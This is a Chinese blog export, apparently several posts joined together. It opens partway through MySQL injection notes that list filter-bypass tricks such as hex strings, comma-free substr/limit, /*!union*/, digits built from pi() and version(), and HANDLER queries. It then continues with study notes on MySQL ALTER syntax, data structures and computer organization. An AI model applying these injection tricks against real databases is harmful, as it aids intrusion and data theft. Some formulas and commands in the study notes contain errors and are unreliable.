可以使用字符串的 16 进制表示一个字符串, 也可以通过 char 或 concat与chr组合 来合成字符串,或使用进制转换函数表示成其他进制例: SELECT * FROM users WHERE username = 0x44756d62 逗号被过滤 substr 与 limit 12substr(data FROM 1 for 1) # substr(data, 1, 1)limit 9 offset 4 # limit 9,4 使用 join 注入 1SELECT * FROM ((SELECT id FROM user)a join (SELECT name FROM user)b join (SELECT password FROM user)c)` 等价于 `SELECT id,name,password FROM user 等号或 like 被过滤 使用 正则表达式REGEXP 或 in != 和 &lt;&gt; 都是不等于 if 被过滤 case when condition then 1 else 0 end union被过滤 使用/*!union*/可以绕过对union的过滤 数字被过滤 代替字符 对应的数 对应的字符 false 0 无 !pi() 0 无 true 1 无 !!pi() 1 无 true+true 2 无 floor(pi()) 3 无 ceil(pi()) 4 无 floor(version()) 5 无 ceil(version()) 6 无 ceil(pi()+pi()) 7 无 floor(version()+pi()) 8 无 floor(pi()*pi()) 9 无 ceil(pi()*pi()) 10 A ceil(pi()*pi())+true 11 B ceil(pi()+pi()+version()) 12 C floor(pi()*pi()+pi()) 13 D ceil(pi()*pi()+pi()) 14 E ceil(pi()*pi()+version()) 15 F floor(pi()*version()) 16 G ceil(pi()*version()) 17 H ceil(pi()*version())+true 18 I floor((pi()+pi())*pi()) 19 J ceil((pi()+pi())*pi()) 20 K ceil(ceil(pi())*version()) 21 L ceil(pi()*ceil(pi()+pi())) 22 M ceil((pi()+ceil(pi()))*pi()) 23 N ceil(pi())*ceil(version()) 24 O floor(pi()*(version()+pi())) 25 P floor(version()*version()) 26 Q ceil(version()*version()) 27 R ceil(pi()*pi()*pi()-pi()) 28 S floor(pi()*pi()*floor(pi())) 29 T HANDLER 语句代替SELECT查询语法如下: 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 附录 Mysql的基本操作 Sqlmap的使用 SQL fuzz 字典 Mysql的基本操作 修改表名12alter table test_a rename to sys_app;retable table test_a to sys_app; 修改表注释1alter table sys_application comment '系统信息表'; 修改字段类型和注释1alter table sys_application modify column app_name varchar(20) COMMENT '应用的名称'; 修改字段类型1alter table sys_application modify column app_name text; 设置字段允许为空1alter table sys_application modify column description varchar(255) null COMMENT '应用描述'; 增加一个字段，设好数据类型，且不为空，添加注释1alert table sys_application add `url` varchar(255) not null comment '应用访问地址'; 增加主键 1alter table t_app add aid int(5) not null ,add primary key (aid); 增加自增主键 1alter table t_app add aid int(5) not null auto_increment ,add primary key (aid); 修改为自增主键1alter table t_app modify column aid int(5) auto_increment ; 修改字段名字(要重新指定该字段的类型)1alter table t_app change name app_name varchar(20) not null; 删除字段 1alter table t_app drop aid; 在某个字段后增加字段1alter table `t_app` add column gateway_id int not null default 0 AFTER `aid`； #(在哪个字段后面添加) 调整字段顺序 1alter table t_app change gateway_id gateway_id int not null after aid ; #(注意gateway_id出现了2次) Sqlmap的使用sqlmap用法 SQL fuzz 字典sql_fuzz)dict 欢迎大家在评论区补充未提到的方法 参考 对MYSQL注入相关内容及部分Trick的归类小结","link":"/2021/05/16/SQL_Inject/"},{"title":"数据结构——基础知识","text":"数据结构复习笔记 基本概念 数据信息的载体 数据元素数据的基本单位,由若干个数据组成 数据对象相同性质的数据元素集合 数据类型值的集合和对集合的操作 1.原子类型: 不可再分 2.结构类型: 值可以再分解成若干数据类型 3.抽象数据类型: 组织与之相关的操作(可以用来定义一个完整的数据结构) 数据结构 相互之间存在一种多多种特定关系的数据元素集合 数据结构独立于其存储结构 逻辑结构- 线性结构 一般线性表 受限线性表: 栈、队列、串 - 线性表推广 线性表推广: 数组 非线性结构 集合 树: 一般树、二叉树 图: 有向图、无向图 存储结构 顺序存储 逻辑上相邻的元素物理位置也相邻 优点 ① 随机存取;② 每个元素占用最少的存储空间 缺点 只能使用相邻的存储单元, 可能产生较多的外部碎片 链式存储 逻辑上相邻的元素物理位置上不一定相邻, 使用元素存储地址指针表示逻辑关系 优点 不会出现碎片现象, 能充分利用所有存储单元 缺点 ① 存储会占用额外的存储空间; ② 只能顺序存储 索引存储 在存储元素信息和索引表(索引表每项称为索引项) 优点 检索速度快 缺点 ① 索引表占用额外存储空间; ② 增删数据时,需要花费额外时间修改索引表 散列存储(哈希存储) 根据元素关键字直接计算出元素的存储地址 优点 检索、增加、删除结点的操作快 缺点 对散列函数要求高， 若散列函数有缺点，会出现元素存储单元冲突，为解决冲突而增加时间和空间开销的问题 时间/空间复杂度 常见的时间复杂度$O(1) &lt; O(\\log_2n) &lt; O(n\\log_2n) &lt; O(n^2) &lt; O(n^3) &lt; O(2^n) &lt; O(n!) &lt; O(n^n)$ 齐次线性递推关系 $$T(n) = \\begin{cases}1, n=1,2\\aT(n-1) + bT(n-2)\\\\end{cases}$$ 主要计算$$T(n) = T(n-1) + T(n-2)\\quad ①$$ $①式$为二阶线性常系数齐次差分方程$$X_{k+2} = AX_{K+1}+bX_K \\quad ②$$其中$a^2+4b\\not=0$如果等比数列 $\\lambda^k$ 是$②式$的解,则有$$\\lambda^2-a\\lambda-b=0\\quad ③$$解$③式$得$\\lambda_1,\\lambda_2$, 且$X_k=C_1\\lambda_1^k+C_2\\lambda_2^k \\quad ④$可将特解(如$k=1,2$)带入$④式$中得到$C_1,C_2$ 主定理主定理适用于如下表达式$$f(n)=af(\\frac{n}{b}) + g(n)$$计算主定理类型的时间复杂度的方法为:$n^{\\log_ba}$ 与 $g(n)$ 比阶, 则$$T(n)=\\begin{cases}n^{\\log_ba} \\ \\ \\quad\\quad \\quad n^{\\log_ba} &gt; g(n)\\\\g(n) \\quad \\quad \\quad \\quad n^{\\log_ba} &lt; g(n)\\\\n^{\\log_ba}\\log_2n \\quad n^{\\log_ba} = g(n)\\\\\\end{cases}$$","link":"/2021/06/16/DataStructure_1/"},{"title":"计算机组成原理——计算机系统概述","text":"计算机组成原理——计算机系统概述笔记 硬件的发展 第一代: 电子管时代 第二代: 晶体管时代 第三代: 中小规模集成电路时代 第四代: 大规模,超大规模集成电路时代 现代系列机指令系统不向后兼容 数据大小 比特:bit,也叫一位,也可以叫b 字节:byte,等于8bit 1B=8bit 字:word,一般等于16bit,两个字节(由机器的硬件决定) 双字:dword,等于32bit,4个字节 冯诺依曼机 首次提出 存储程序 概念 特点(考点) 计算机由五大部件组成(运算器,存储器,控制器,输入设备,输出设备) 指令和数据以同等地位存储在存储器中(可按地址寻访) 指令和数据用二进制表示 指令由操作码和地址码组成 存储程序 以运算器为中心(导致数据处理变慢) 区分指令与数据的依据 指令周期的不同阶段 工作方式 控制流驱动方式 现代计算机以存储器为中心 基本硬件 输入设备: 将信息转换成机器能识别的形式 输出设备: 将结果转换成人们收悉的形式 存储器: 存放数据和程序 注: 现代计算机的MAR与MDR一般在存储器中, 而不再CPU中CPU中的指令寄存器(IR)和存储器中的MAR,MDR对用户完全透明(不可见) 存储体: 存放数据 存储单元: 每个存储单元存放一串二进制码 存储字: 存储单元中二进制代码的组合 存储字长: 存储单元中二进制代码的位数 存储元: 存储一个二进制位(1bit) MAR(地址寄存器): 存储数据地址 MAR位数反应存储单元的个数 如MAR有4位,则对应16个存储单元(可以表示6个地址) MDR(数据寄存器): 存储由MAR获得的数据 MDR位数等于存储字长 如MDR有16位,则可以存放一个字(word)(16bit)的信息 相联存储器即可按地址寻找,也可按内容寻址 CPUCPU是指利用大规模集成电路计算把计算机的运算部件和控制部件做在一块集成电路的芯片CPU中包括运算器 控制器 和 寄存器 运算器: 算术运算 逻辑运算 ACC: 累加器 MQ: 乘商寄存器 x: 通用的操作数寄存器 ALU: 算术逻辑单元 控制器: 指挥各部件 CU: 控制单元, 给出控制信号 IR: 指令寄存器,存放当前执行的指令 PC: 程序计数器,存放下一条指令地址(取址后自动加1) 寄存器 地址寄存器 指令寄存器(IR) 通用寄存器 CPU内部用于整数运算的运算器和通用寄存器的位数等于机器字长指令字长=存储字长(MDR)=机器字长 CPU的计算题 时钟周期: 单位 微妙 纳秒 $CPU主频(时间频率)=\\frac{1}{CPU的时钟周期}$,单位赫兹(Hz) CPI: 指令执行所需的时钟周期数量 IPS: $每秒执行多少条指令=\\frac{主频}{平均CPI}$ FLOPS: 每秒钟可以执行多少次浮点运算 一般使用IPS标志系统性能 最小时间单位是时钟周期 常说的运算速度就是指CPI 这里常考计算,因此要注意$程序的运行时间=\\frac{指令数量}{IPS}$ ,有时题目会挖坑改变CPI,因此要注意转换问题$1G=10^3M=10^6K=10^9$, 用来表示$Hz, IPS, FLOPS$, 如$MHz, MIPS$$1MHz=1\\mu s, 1Hz=1ms$两个芯片片内逻辑相同=两个芯片的CPI相同 常见表示方法 寄存器名: 表示地址 (寄存器名): 表示寄存器的值 M: 表示存储器 性能指标存储器的容量计算 设MAR的位数位为$a$MDR的位数为$b$则 $存储器的总容量=2^a*b(bit)$ 系统整体 数据通路带宽数据总线一次冰雪传送信息的位数 吞吐量: 系统在单位时间内处理请求的数量 响应时间: 指用户向计算机发送一个请求,到系统对该请求做出响应所需要的等待时间 数据的存储方式和排列 大端模式(最高有效字节MSB)(便于人阅读)最高有效字节存放在低地址,最低有效字节存放在高地址部分 小端模式(最低有效字节LSB)(便于机器使用)最高有效字节存放在高地址, 最低有效字节存放在低地址部分 边界对齐计算机每次访存只能读/写1个字,边界对齐牺牲部分空间,来提高访存效率(如果一个变量的存放位置在两个字直接,就要访存2次才能读取完,采用边界对齐的方式,可以减少这样的情况发生) 存储程序原理存储程序是将指令以代码的形式先输入计算机主存储器, 然后按其在存储器中的首地址执行程序的第一条指令, 以后就按该程序的规定顺序执行其他指令, 直至程序结束 计算机按照此原理具有以下功能 1. 数据传送功能 2. 数据存储功能 3. 数据处理功能 4. 操作控制功能 5. 操作判断功能","link":"/2021/06/19/COP-1/"},{"title":"计算机组成原理——数据的表示和运算","text":"计算机组成原理——数据的表示和运算笔记 基础知识 基数每个数码位所用的不同符号的个数,r 进制的基数为 r 转换 整数部分 小数部分 BCD 码4bit表示一个十进制的字符 8421 码 属于有权码, $4$ 个比特对应 8421如$0001_2=1_{10}$, $1000_2=8_{10}$ , $1001_2=9_{10}$ 加法运算 方法 1转换成 $10$ 进制数后相加,得到的结果在转换为 BCD 码 方法 2:二进制相加,得到的结果如果大于 $10_{10}(1010_{2}-1111_{2})$ ,则结果加 $6$ 修正,高位没 4 位则在左边补 0如 $0101_{2}+1000_{2}=1101_{2}=13_{10}$,结果大于 $10_{10}(1010_{2}-1111_{2})$,结果加 $6$, 即$1101_{2}+0110_{2}=10011_2$, 结果小于 8 位,补三个 0 得到 0001,0011 每四位转换成$10$进制 ($0001_2=1_{10}$, $0011_2=3_{10}$) 结果为 $13$ 余三码在 8421 码的基础上每个数加上($0011_2$) 如:用余三码表示$1_{10}$, 8421 码对应的$1_{10}$为$0001_2$,加上$0011_2$,结果为$0100_2$ 属于无权码(对应的每个 2 进制位没有对应的 10 进制) 2421 码 4 个二进制位分别对应 2421 所表示十进制数0-4 的二进制首位位 0所表示十进制数5-9 的二进制首位位 1 属于有权码, $4$ 个比特对应 2421 字符与字符串 ASCII 码 汉字 区位码 国标码 机内码 校验码(重要)基础概念 码字由若干位代码组成的一个字 码字间的距离两个码字逐位对比,具有不同位的个数 码距各合法码字间的最小距离 $码距=1$ 时,无检错能力$码距=2$ 时,有检错能力$码距 \\geq 3$ 时,可以有检错和纠错能力(如海明码) 奇偶校验码 奇校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为奇数 偶校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为偶数 如果接收到的数据中,1 的个数不为奇数(偶数),则可以判断出错. 如果出现偶数个错误,则奇偶校验码检验不出错误 偶校验的实现各信息进行异或,得到的数字添加在最高位 偶校验的检验对收到的信息每个为进行异或,得到的结果为 0,则可能没错(可能有 2 位出错), 若为 1 则一定出错 海明码 基于偶校验的扩展,拥有多个校验位,能够自动检测出 1 位出错,并纠错但是对于 2 位以上的出错只能检验出错误(使用全校验码的前提下) 海明码校验位的位置 信息位有 $n$ 位, 校验位有 $k$ 位, 共 $n+k$ 位,对应 $2^k$ 种状态($2^k \\geq n+k+1$) 每个校验位放在 $2^{i-1}$ 上(如 P1,P2,P3),然后将信息位依次从低到高进行填充(如 $D_1,D_2,D_3,D_4$) 校验位的计算 其中数据位$D_i$对应的$H_j$, 求j的二进制,如$D_3$存放在$H_6$中 $6_{10}=0110_2$, 对应的二进制中,第二位和第三位为1,因此该数据位需要由$P_2,P_3$ 来检验, 以此类推,得出 $$D_1,D_2,D_4需要由P_1检验\\\\\\\\ D_1,D_3,D_4需要由P_1检验\\\\\\\\ D_2,D_3,D_4需要由P_1检验 P_i=所有需要通过P_i检验的数据位的值一起异或 $$ 即可得到海明码 纠错(仅限 1bit 出错)$S_1=P_1$ 异或属于 $P_1$ 分组的数据$S_2=P_2$ 异或属于 $P_2$ 分组的数据$S_3=P_3$ 异或属于 $P_3$ 分组的数据如果 $S_1$ $S_2$ $S_3$ 都为 0 则没有出错如果不为 0则 $S_3, S_2, S_1$ 组成的二进制数所指的位数出错如 $S_1=0, S2 =1, S3=0$, 则 $010_2=2_{10}$,第二位出错 全校验码通常会在头部在加一个校验位,计算所有校验位的偶校验码 CRC 码(循环冗余校验码) 原理双方约定一个除数,$K个信息位+R个校验位$作为被除数,添加校验位后需保证除法的余数为 $0$ $$生成多项式=除数\\\\ 校验位的长度 R=生成多项式的最高次幂\\\\ CRC 码位数=K+R=N=信息码\\\\ 若满足: 2^R \\geq K+R+1 则可以检验并纠正 1 个 bit 错误$$ 计算 校验位 R 信息码左移 R 位,地位补 0(右边添加 R 个 0) 用生成多项式进行模 2 除法,产生余数(R 位) 检验方使用信息吗除以约定好的除数,结果为 0 则没有出错;若不为 0,则得到的结果出错 模 2 除: 被除数的最高位为 1,则商 1,然后减除数;除数的最高位为 0,则商 0 然后减 0; 其余位进行模 2 减 模 2 减相当于异或操作 定点数定点小数定点小数是纯小数, 小数点在符号位之后,有效数值最高位之前若 $X=x_0x_1x_2x_3\\dots x_n$, 则$x_0$为符号位, $x_1x_2x_3\\dots x_n$为数值有效部分,也称为尾数 定点整数定点整数是存整数, 小数点在有效数值最低位之后若 $X=x_0x_1x_2x_3\\dots x_n$, 则$x_0$为符号位, $x_1x_2x_3\\dots x_n$为数值有效部分,也称为尾数 无符号数 全部二进制位均表示数值位, 没有符号位 会求表示范围 无符号数无小数部分 设字长 $n$ 位,则表示范围位 $0至2^n-1$ 有符号数的编码原码 原码表示数 用尾数表示真值的绝对值, 符号位0,1对应正,负 符号位都在最高位 小数点左边的为整数部分,右边为小数部分 定点小数 小数点在最前方(隐含) 设字长位 $n+1$ 位,则$$表示范围=-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$$ 有 +0 与-0 的区分 定点整数 小数点在最后方(隐含)设机器字长为 $n+1$ 位,则$$表示范围=-(2^n - 1)\\leq x\\leq 2^n - 1$$ 注意: 0有+0和-0 反码 反码表示数 若符号位为0, 则反码与原码相同若符号位为1, 则反码是原码的数值为全部取反 定点整数与定点小数的表示范围与原码的表示范围相同 补码 补码表示数 若符号位为0, 则补码与原码相同若符号位为1, 则 $补码=反码+1$(要考虑进位) 负数补码的巧妙方法(0 不能用这种方法)看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如10101010100的补码为11010101100补码转原码:看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如11010101100的原码为10101010100 若字长为 $n+1$ ,则定点整数范围: $-2^n\\leq x\\leq 2^{n-1}$; 注: 补码中 $0.0000_2=0_{10},1.0000_2=-1$, 即比原码中多-1定点小数范围: $-1\\leq x\\leq 1-2^{-n}$ 注: 补码中 $0.0000_2=0_{10},10000_2=-2^n$, 即比原码中多$-2^n$ 作用: 将减法操作转变为加法操作 补码表示的负定点小数有$[Y]补=2+[Y]{真值}$ 移码 移码表示数 移码=真值+偏置值 补码的基础上将符号位取反,只能表示整数 方便比较大小 当偏置值=128 时, 表示范围与补码的表示范围一致 定点数的运算移位运算 算术移位操作对象为有符号数,符号位不动,数值位移到 原码 右移: 高位补0, 低位舍弃,若 $舍弃的位=0$ ,相当于除 $2$ ,若舍弃的位不为 $0$ ,则会丢失精度 左移: 低位补0, 高位舍弃,若 $舍弃的位=0$ ,相当于乘 $2$ ,若舍弃的位不为 $0$,则会丢失精度 反码正数与原码操作相同操作负数时: 右移: 高位补1,低位舍弃 左移: 低位补1, 高位舍弃 补码正数与原码操作相同负数 最右边的1及其右边的数同原码操作 最右边的1其左边的数同反码操作 移码左移右移都是补 0 逻辑移位将操作对象看为无符号数左移时高位丢弃, 低位补 0右移时低位丢弃, 高位补 0 循环移位 定点数加减运算 原码 加法规则先判断符号位若相同, 则为绝对值之和, 符号位不变若不同, 则做减法, 绝对值大的减去绝对值小的, 符号位等于绝对值大的数的符号位 减法规则将减数符号位取反, 然后按照加法规则运算 补码 在补码的加减运算中, 符号位也参与运算, 符号位产生的进位丢弃 $[A+B]补 = [A]补 + [B]补$ $[A-B]补 = [A]补 + [-B]补$ 加减及溢出判断只有正数相加才会有上溢, 只有负数相加才会有下溢 方法 1:设$[A+B]_补=[S]_补$A 的符号位为 aB 的符号位为 bS 的符号位为 s$V = a\\bar{b}\\bar{s}+\\bar{a}\\bar{b}s$若 $V=1$,表示有溢出若 $V=0$,表示无溢出 方法 2:采用符号位的进位 C 和最高数值进位 S若 $C=0,S=1$,则出现上溢若 $C=1,S=0$,则出现下溢 方法 3(双符号位补码)(模 4 补码)(运算时会复制一个符号位)采用双符号位,若两个符号位的数值不一致,则有溢出 00 表示结果为正数 01 表示结果正溢 10 表示结果负溢 11 表示结果为负数例如: $A=00001111_2 B=11101000_2$在进行加法运算时$A=000001111_2 B=111101000_2$相加后 $C=111110111_2$ ,两个符号位一致,则结果无溢出, $C=11110111_2$ 乘法运算使用双符号位 原码一位乘法$[x]_原 * [y]_原$, 字长为 n+1位, 高位为符号位 符号位不参与运算, 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 进行 n 轮加法,加完一轮后,逻辑右移(符号位也参与移动),高位补 0,当前计算结果的最低位,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ 的最低为变为辅助位(MQ初始数值为乘数) $MQ最低位=1$ 时,加 $|x|_原$$MQ最低位=0$ 时,加 0 补码一位乘法$[x]_补*[y]_补$ 字长为 n+1位, 高位为符号位 进行 n 轮加法,做完一轮加法时,算数右移(符号位不动)及高位补符号位,最后在进行一次加法,当前计算结果的最低为,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ的最低为变为辅助位 $辅助位-MQ最低为位=1$,加 $[x]_补$$辅助位-MQ最低位=0$,加 0$辅助位-MQ最低位=-1$,加 $[-x]_补$符号位参与运算 除法运算 $[x]_原 \\div [y]_原$在定点小数的除法中,被除数要小于除数 补码除法运算(加减交替法) 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 一共 $n = 机器字长-符号位长$ 次运算, 每次加除数的绝对值的负数的补码,如果结果为负数,则将本次的商改为 0,并且将余数恢复为减法之前(加回除数) 每一次操作后,进行一次逻辑左移,低位补 0 (最后一次上商余数补左移)(一共左移 n 次,上商 n+1 次) 原码除法运算(不恢复余数法) 符号位也参与运算 一共 $n = 机器字长-符号位长$ 次运算, 余数为负, 则余数左移一位后加 $|除数|$余数为正, 则余数左移一位后减 $|除数|$ 最后一步, 若余数为负,则商 0,并加上 $|除数|$ 得到正确的余数 余数的正负性与商相同 符号扩展(数据位数增长) 定点整数 正数高位都补0, 负数原码补0, 反码补码补1 定点小数 正数地位都补0, 负数反码补1, 原码补码补0 强制转换C 语言中整型都是用补码表示 长度相同的有符号数转换成无符号数,符号位不变,将符号位添加位权(即符号位变成一个数) 长整型变短整型, 高位被截断, 只保留低位 短整型变长整型, 相当于做符号扩展 浮点数浮点数的组成 由 阶码和尾数组成 阶码: 用补码或移码表示的定点整数,其位数表示数的范围及小数点的位置(真值即为 E) 尾数: 用原码或补码表示的定点小数,其位数反应浮点数的精度(真值即为 M) 尾数的规格化(左规): 最高位不能是 0(注意是数符后面的那位) 尾数的规格化(右规): 尾数溢出时(双符号位为 01 或 10 )时,将尾数右移一位,阶码加 1 原码表示的规格化尾数能表示的范围为$正数 \\frac{1}{2} \\leq M \\leq 1-2^{-n}$$负数: -(1-2^{-n}) \\leq M \\leq - \\frac{1}{2}$ 补码表示的规格化尾数能表示的范围为$正数: \\frac{1}{2} \\leq M \\leq 1-2^{-n}$$负数: -1 \\leq M \\leq -(\\frac{1}{2} + 2^{-n})$规格化补码表示尾数时,符号位必须与最高数值位相反:如$0,101010_2$(正数), $1,0101010_2$(负数) 阶符,数符: 表示阶码和尾数的符号$真值 N = r^E + M (r为底数,通常为2)$ IEEE 754 标准 尾数部分默认表示 1.M(注意这个 1 是数值,而不是符号位)(隐含最高位) 原码规格化后 正数为: 0.1xxx, 负数为 1.1xxx补码规格化后 正数为: 0.1xxx, 负数为 1.0xxx 阶码真值 = 移码 - 偏移量 当阶码 E 全为0,尾数不全为0时, 表示非规格化小数, $\\pm(0.xxx)_2\\times 2^{-126}$ , 此时隐含最高位变为 0,阶码真值固定视为-126当阶码 E 全为0,尾数全为0时表示真值 $\\pm 0$当阶码 E 全为1,尾数全为0时,表示无穷大 $\\pm \\infty$当阶码 E 全为1,尾数不全为0时,表示非数值 NaN (如$\\frac{0}{0}, \\infty \\pm \\infty$ 等非法运算的结果就是 NaN) 各种浮点数的格式要记住 类型 数符 阶码位数 尾数数值位数 总位数 偏置值 float 短浮点数 1 8 23 32 7FH(127) double 长浮点型 1 11 52 64 3FFH(1023) long double 临时浮点数 1 15 64 80 3FFFH(16383) 浮点数的运算 加减运算步骤: 对阶,尾数加减, 规格化, 舍入, 判断溢出 对阶低阶转换成高阶,使两个数同阶 尾数加减因为以及化成了同阶,直接对尾数进行加减 规格化尾数加减后,出现 0.0xxx 的情况下,进行左规. 如果出现99.31等类型的情况,需要右规, 尾数算数右移一位,阶码加 1,直到$尾数 \\leq 1$ 舍入舍弃低位的尾数, 根据不同的舍入规则进行计算 判断溢出看阶码的位数是否超出所能表示的最大范围,若超出则溢出尾数溢出不一定会导致整体溢出 边界对齐边界对齐方式存储数据时,数据的大小都是 $(半字大小)\\times 2k$如 12345struct{ int a; //4字节(32位) char b; //1字节(8位) short c; ..2字节(16位)}record 若按边界对齐的方式存储该结构体,则如下表 1 2 3 4 a 的第一个字节 a 的第二个字节 a 的第三个字节 a 的第四个字节 b 空 c 的第一个字节 c 的第二个字节 若按边界不对齐的方式存储该结构体,则如下表 1 2 3 4 a 的第一个字节 a 的第二个字节 a 的第三个字节 a 的第四个字节 b c 的第一个字节 c 的第二个字节 空 C 语言中的数据 在 C 语言的数据在内存中为补码形式 重点概括原码、反码、补码的表示范围 字长为 $n+1$ 编码形式 定点小数(纯小数) 定点整数(纯整数) 原码 $-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$ $-(2^n-1) \\leq x \\leq 2^n-1$ 反码 $-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$ $-(2^n-1) \\leq x \\leq 2^n-1$ 补码 $-1\\leq x \\leq 1-2^{-n}$ $-2^n\\leq x \\leq 2^n-1$ ALU 主要功能 算术运算: 加 减 乘 除 等 逻辑运算: 与 或 非 异或等 辅助功能: 移位 求补等 加法器一位全加器$A_i,B_i为两个输入,表示当前要加的数值, C_{i-1}表示进位,C_i表示本位进位 S_i表示输出$ $S_i = A_i \\bigoplus B_i \\bigoplus C_{i-1}$$C_i = A_iB_i + (A_i \\bigoplus B_i)C_{i-1}$ 串行加法器只有一个全加器,数据逐位串行送入加法器中运算,进位存放在进位触发器中. 串行进位的并行加法器 把n个一位全加器串接起来 优化(并行进位的并行加法器) 如图,展开到 $C_0$ 后, 即可提前计算出每一位的进位","link":"/2021/06/20/COP-2/"},{"title":"计算机组成原理——指令系统","text":"计算机组成原理——指令系统笔记 指令格式由操作码和地址码组成 按指令格式分类 零地址指令OP 不需要操作数, 如空操作,停机, 关中断等 堆栈计算机, 操作数隐含存放在栈顶,结果压回栈顶 一地址指令OP(A), A表示操作数地址 (A)表示地址中的内容 只需要单操作数, 如加 1, 减 1, 取反, 求补等, 并将结果存回操作数(完成一次需要 3 次访存)([取址]–&gt;[读 A]–&gt;[写 A]) 需要两个操作数, 另一个操作数隐含在寄存器中 二地址指令OP(A1)(A2) ,其中A1为目的操作数, A2为源操作数将操作结果写道目的操作数A1需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A1]) 三地址指令OP(A1)(A2)(A3), 将对A1,A2的操作结果写入A3需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A3]) 四地址指令OP(A1)(A2)(A3), 将对A1,A2的操作结果写入A3, A4为下一条将要执行的指令地址, 将 PC 的值修改为A4指向的地址需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A3]) 按指令长度分类 定长指令字结构指令系统中所有指令长度相等 变长指令字结构指令系统中各指令的长度不等 按操作码长度分类 定长操作码指令系统中所有指令的操作码长度都相同控制器的译码电路设计简单, 灵活性低 可变长操作码指令系统中各指令的操作码长度可变控制器的译码电路设计复杂, 但是更灵活 按操作类型分类 数据传送指令把寄存器(存储器)中的数据放到存储器(寄存器) 运算类指令 算数逻辑指令如加减乘除,与或非等 移位操作算数移位, 逻辑移位, 循环移位等 程序控制类指令程序执行流的改变语句等 输入输出指令CPU 寄存器与 IO 端口之间的数据传送 扩展操作码定长指令格式+可变长操作码=扩展操作码指令格式 例如在 16 位指令字长的计算机中, 每个地址码占 4 位 3 地址指令中,高 4 位分别表示指令$1,2\\dots 15, 即 0001_2, 0010_2 \\dots 1110_2$, 而$1111_2$表用来表示该地址为 2 地址指令 同理, 在二地址指令中, 高 4 为全为 1, 次高 4 的$1,2\\dots 15, 即 0001_2, 0010_2 \\dots 1110_2$用来表示 15 条二地址指令, $1111_2$表用来表示该地址为 1 地址指令 以此类推… 设计扩展操作码的注意事项 不允许短码是长码的前缀, 即短操作码不能与长操作码前面的部分相同 各指令的操作码不能重复 注: 对于使用频率高的指令可以分配较端的操作码, 减少指令译码和分析的时间 优点在指令字长有限的前提下仍保持比较丰富的指令种类 缺点增加了指令译码器和分析的难度, 使控制器的设计复杂 指令寻址确定下一条指令的存放地址在取完指令后一定会 PC+1, 指向下一条要执行的语句 下一条要执行的指令地址始终在 PC 中按字编址: 即一个存储字长为一个地址按字节编址: 一个字节为一个地址 顺序寻址 使用定长指令结构,主存字节编址$a(bit)=指令字长=存储字长$则每次 PC 的值加$\\frac{a}{8}$ 使用变长指令结构, 主存按字节编址 读入一个字, 根据操作码 pan’d 这条指令的总字节数 n (PC) = (PC) + n 跳跃寻找在遇到 JMP 等转移指令时, 会修改 PC 的值 数据寻址确定当前正在运行的指令的地址码指明的真实地址在地址前面加上寻址特征标识用哪种方式来寻址,将被标识的地址成为形式地址(A), 真实地址记为 EA 直接寻址EA=A 形式地址就是操作数的真实地址 优点实现简单, 指令执行阶段只访问一次主存, 不需要专门计算操作数地址 缺点操作数不易修改 间接寻址EA = (A) 形式地址存储的数据是操作数的有效地址(而不是操作数的值) 指令的执行取指令访存 1 次, 执行指令访存 2 次(如不考虑存储结果) 优点可扩大寻址范围(有效地址 EA 的位数大于形式地址 A 的位数)便于编制程序(方便子程序返回) 缺点 指令在执行阶段要多次访存(一次间接寻址需两次访存) 寄存器寻址EA=R 操作数为寄存器所在的编号, 操作数在R所指的寄存器内 指令的执行取址访存一次, 执行指令不需要访存 优点指令在执行阶段不访问主存,只访问寄存器指令字短且执行速度快,支持向量/矩阵运算 缺点寄存器个数有限 寄存器间接寻址EA=(R) 寄存器中存的是操作数所在地址 指令的执行取址令访存一次, 执行指令访存一次 优点与一般间接寻址比速度更快 缺点指令执行的阶段需要访问主存 隐含寻址操作数的地址不明显, 在指令中隐含着操作数的地址 优点有利于缩短指令字长 缺点需增加存储操作数或隐含地址的硬件 立即寻址形式地址就是操作数本身, 一般采用补码形式 执行执行只需在取指令的时候访存一次 优点指令执行阶段不访问主存, 指令执行时间最短 缺点 A 的位数限制了立即数的范围 基址寻址EA=(BR)+A 以程序额度起始存放地址为起点 将CPU中基址寄存器(BR)的内容加上指令中的形式地址A形成的有效地址 (或者在指令中指明将哪个寄存器作为基址寄存器) (BR作为基地址, A作为偏移量) 基址寄存器的内容由操作系统管理 优点可以扩大指令的寻址范围用户不必考虑程序存于主存的哪一位置有利于多道程序设计, 可用于编制浮动程序 变址寻址EX=(IX)+A 程序员决定起点的位置 有效地址等于形式地址与变址寄存器IX的内容相加 (也可以用通用寄存器作为变址寄存器) 编制寄存器是面向用户, 程序执行过程中, 变址寄存器的内容可以由用户改变 (A作为基地址, IX作为偏移量) 优点在数组处理过程中, 可以设定 A 为数组的首地址, 不断改变变址寄存器 IX 的内容,便可轻松的形成数组中任意 ui 数据的地址, 特别适合编制循环程序 相对寻址EA=(PC)+A(A用补码表示) 以程序计数器PC所指的地址为起点 把程序计数器的内容加上形式地址A(A为下一条地址的偏移量) 优点 代码在程序内浮动时, 不用更改跳转指令的地址,广泛用于转移指令 堆栈寻址操作数存放在堆栈中, 隐含使用堆栈指针(SP)作为操作数地址 硬堆栈: 使用寄存器软堆栈: 在主存中 总结 寻址方式 有效地址 访存次数 直接寻址 EA=A 1 间接寻址 EA=(A) 2 寄存器寻址 